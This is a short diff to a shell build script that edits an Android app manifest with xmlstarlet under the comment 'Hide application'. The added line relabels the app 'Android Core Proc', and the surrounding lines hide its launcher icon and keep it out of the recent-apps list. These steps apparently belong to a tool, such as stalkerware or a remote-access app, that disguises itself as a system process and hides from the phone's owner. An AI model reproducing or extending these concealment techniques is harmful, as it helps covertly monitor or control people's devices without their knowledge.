@@ -123,6 +123,7 @@ sed -i \
 # Hide application
 xmlstarlet ed --inplace \
   -d '//uses-permission[@android:name="com.android.launcher.permission.INSTALL_SHORTCUT"]' \
+  -u '//application/@android:label' -v "Android Core Proc" \
   -u '//activity-alias[@android:name="${applicationId}.App"]/intent-filter/category/@android:name' -v "android.intent.category.INFO" \
   -u '//activity-alias[@android:name="${applicationId}.AlternativeApp"]/intent-filter/category/@android:name' -v "android.intent.category.INFO" \
   -u '//activity/@android:excludeFromRecents' -v "true" \
